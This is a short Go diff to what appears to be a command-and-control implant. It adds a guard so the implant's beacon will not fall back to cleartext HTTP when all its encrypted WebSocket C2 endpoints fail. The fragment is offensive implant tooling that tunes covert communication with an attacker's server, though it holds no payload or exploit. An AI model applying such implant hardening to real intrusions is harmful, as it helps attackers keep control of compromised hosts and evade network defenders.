@@ -52,6 +52,13 @@ func sendWSSBeacon(body []byte) []byte {
 		return resp
 	}
 
+	// Downgrade guard: an implant configured exclusively with encrypted C2
+	// URLs must not silently continue over cleartext HTTP when every WSS
+	// endpoint fails — that is exactly the network position an attacker wants.
+	if c2URLListSecureOnly() {
+		fmt.Println("[c2] WARN: all WebSocket endpoints failed and every configured C2 URL is encrypted; refusing cleartext HTTP fallback")
+		return nil
+	}
 	fmt.Printf("[c2] WARN: all WebSocket endpoints failed, falling back to HTTP beacon (%d URL(s))\n", len(urls))
 	return sendBeacon(body)
 }
